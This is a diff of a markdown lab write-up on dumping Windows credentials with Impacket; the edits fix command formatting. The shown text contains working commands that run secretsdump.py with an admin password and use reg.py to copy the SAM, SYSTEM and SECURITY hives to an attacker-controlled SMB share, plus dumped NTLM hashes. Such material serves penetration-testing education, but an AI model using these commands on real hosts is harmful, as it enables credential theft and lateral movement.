@@ -19,9 +19,9 @@ It means that we are an administrator in this machine.
 
 OK, now that we do know that we do have a valid administrator account with us, we can now use [secretsdump.py](http://secretsdump.py/) to retrieved the secrets of the target machine.
 
-`s``[ecretsdump.py](http://ecretsdump.py/)`` north/jeor.mormont:'_L0ngCl@w_'@10.4.10.22`
+`secretsdump.py north/jeor.mormont:'_L0ngCl@w_'@10.4.10.22`
 
-```shell
+```
 Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
 
 [*] Service RemoteRegistry is in stopped state
@@ -68,7 +68,7 @@ The Security Account Manager (SAM) is a database that is present on computers ru
 
 The first think [secretsdump.py](http://secretsdump.py/) will be dumping is the SAM.
 
-```shell
+```
 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -95,9 +95,9 @@ First we start an SMB Server on our local machine to save the results locally.
 
 Then we can use [reg.py](http://reg.py/) from [Impacket](https://github.com/fortra/impacket/blob/master/examples/reg.py) to make the SAM & SYSTEM requests.
 
-`[reg.py](http://reg.py/)`` north/jeor.mormont:'`*`L0ngCl@w`*`'@10.4.10.22 save -keyName 'HKLM\SAM' -o '\\10.4.10.1\share'`
+`reg.py north/jeor.mormont:'`*`L0ngCl@w`*`'@10.4.10.22 save -keyName 'HKLM\SAM' -o '\\10.4.10.1\share'`
 
-`[reg.py](http://reg.py/)`` north/jeor.mormont:'`*`L0ngCl@w`*`'@10.4.10.22 save -keyName 'HKLM\SYSTEM' -o '\\10.4.10.1\share'`
+`reg.py north/jeor.mormont:'`*`L0ngCl@w`*`'@10.4.10.22 save -keyName 'HKLM\SYSTEM' -o '\\10.4.10.1\share'`
 
 ![screenshot_2.png](./images/screenshot_2.png)
 
@@ -119,9 +119,9 @@ Holding the SAM & SYSTEM with us we can use secretsdumps.py to decrypt **LM** an
 
 ## Decrypting LM & NT offline using secretsdump.py
 
-`[secretsdump.py](http://secretsdump.py/)`` -sam SAM -system SYSTEM LOCAL`
+`secretsdump.py -sam SAM -system SYSTEM LOCAL`
 
-```shell
+```
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -135,7 +135,7 @@ Please be aware of the following format of the hashes.
 
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
 
-```plain text
+``` text
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
 user: Administrator
 RID : 500
@@ -197,15 +197,15 @@ First we start an SMB Server on our local machine to save the results locally.
 
 Then we can use [reg.py](http://reg.py/) from [Impacket](https://github.com/fortra/impacket/blob/master/examples/reg.py) to make the SAM & SYSTEM requests.
 
-`[reg.py](http://reg.py/)`` north/jeor.mormont:'_`*`L0ngCl@w_`*`'@10.4.10.22 save -keyName 'HKLM\SYSTEM' -o '\\10.4.10.1\share'`
+`reg.py north/jeor.mormont:'_`*`L0ngCl@w_`*`'@10.4.10.22 save -keyName 'HKLM\SYSTEM' -o '\\10.4.10.1\share'`
 
-`[reg.py](http://reg.py/)`` north/jeor.mormont:'_`*`L0ngCl@w_`*`'@10.4.10.22 save -keyName 'HKLM\SECURITY' -o '\\10.4.10.1\share'`
+`reg.py north/jeor.mormont:'_`*`L0ngCl@w_`*`'@10.4.10.22 save -keyName 'HKLM\SECURITY' -o '\\10.4.10.1\share'`
 
 Then we can extract the contain offline.
 
 `secretsdump -security SECURITY.save -system SYSTEM.save LOCAL`
 
-```shell
+```
 Impacket v0.12.0.dev1+20231130.165011.d370e63 - Copyright 2023 Fortra
 
 [*] Target system bootKey: 0x928d80db0d4066816b5b48e573ce4297
